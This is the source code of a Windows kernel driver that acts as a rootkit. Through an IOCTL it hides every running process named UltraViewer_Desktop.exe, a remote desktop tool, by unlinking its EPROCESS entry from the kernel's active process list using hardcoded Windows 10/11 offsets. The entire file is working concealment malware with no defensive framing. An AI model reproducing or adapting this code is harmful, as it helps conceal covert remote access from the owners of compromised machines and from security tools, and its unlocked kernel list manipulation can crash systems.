#include <ntddk.h>

#define DEVICE_NAME     L"\\Device\\HideProc"
#define SYMLINK_NAME    L"\\DosDevices\\HideProc"
#define IOCTL_HIDE_PROCESS CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)

#define HIDE_PROCNAME L"UltraViewer_Desktop.exe"

// Offsets for Windows 10/11 x64 - update if on different build
#define EPROCESS_ACTIVELINKS_OFFSET  0x448
#define EPROCESS_IMAGENAME_OFFSET    0x5A8

DRIVER_UNLOAD DriverUnload;
DRIVER_DISPATCH DeviceControl;
DRIVER_DISPATCH CreateClose;

void HideProcess(PEPROCESS pEprocess) {
    PLIST_ENTRY pList = (PLIST_ENTRY)((PUCHAR)pEprocess + EPROCESS_ACTIVELINKS_OFFSET);
    pList->Blink->Flink = pList->Flink;
    pList->Flink->Blink = pList->Blink;
    pList->Flink = (PLIST_ENTRY)&pList->Flink;
    pList->Blink = (PLIST_ENTRY)&pList->Flink;
}

void HideByName() {
    PEPROCESS pEprocess = NULL;
    UNICODE_STRING target;
    RtlInitUnicodeString(&target, HIDE_PROCNAME);

    for (ULONG pid = 4; pid < 0x10000; pid += 4) {
        if (NT_SUCCESS(PsLookupProcessByProcessId((HANDLE)(ULONG_PTR)pid, &pEprocess))) {
            char* imageName = (char*)((PUCHAR)pEprocess + EPROCESS_IMAGENAME_OFFSET);
            ANSI_STRING ansiName;
            RtlInitAnsiString(&ansiName, imageName);
            UNICODE_STRING uniName;
            if (NT_SUCCESS(RtlAnsiStringToUnicodeString(&uniName, &ansiName, TRUE))) {
                if (RtlEqualUnicodeString(&uniName, &target, TRUE))
                    HideProcess(pEprocess);
                RtlFreeUnicodeString(&uniName);
            }
            ObDereferenceObject(pEprocess);
        }
    }
}

NTSTATUS DeviceControl(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
    UNREFERENCED_PARAMETER(DeviceObject);
    PIO_STACK_LOCATION stack = IoGetCurrentIrpStackLocation(Irp);
    NTSTATUS status = STATUS_SUCCESS;

    if (stack->Parameters.DeviceIoControl.IoControlCode == IOCTL_HIDE_PROCESS)
        HideByName();
    else
        status = STATUS_INVALID_DEVICE_REQUEST;

    Irp->IoStatus.Status = status;
    Irp->IoStatus.Information = 0;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);
    return status;
}

NTSTATUS CreateClose(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
    UNREFERENCED_PARAMETER(DeviceObject);
    Irp->IoStatus.Status = STATUS_SUCCESS;
    Irp->IoStatus.Information = 0;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);
    return STATUS_SUCCESS;
}

void DriverUnload(PDRIVER_OBJECT DriverObject) {
    UNICODE_STRING symlink;
    RtlInitUnicodeString(&symlink, SYMLINK_NAME);
    IoDeleteSymbolicLink(&symlink);
    IoDeleteDevice(DriverObject->DeviceObject);
}

NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) {
    UNREFERENCED_PARAMETER(RegistryPath);

    UNICODE_STRING devName, symlink;
    RtlInitUnicodeString(&devName, DEVICE_NAME);
    RtlInitUnicodeString(&symlink, SYMLINK_NAME);

    PDEVICE_OBJECT devObj;
    NTSTATUS status = IoCreateDevice(DriverObject, 0, &devName, FILE_DEVICE_UNKNOWN, 0, FALSE, &devObj);
    if (!NT_SUCCESS(status)) return status;

    IoCreateSymbolicLink(&symlink, &devName);

    DriverObject->MajorFunction[IRP_MJ_CREATE] = CreateClose;
    DriverObject->MajorFunction[IRP_MJ_CLOSE] = CreateClose;
    DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = DeviceControl;
    DriverObject->DriverUnload = DriverUnload;

    devObj->Flags &= ~DO_DEVICE_INITIALIZING;
    return STATUS_SUCCESS;
}
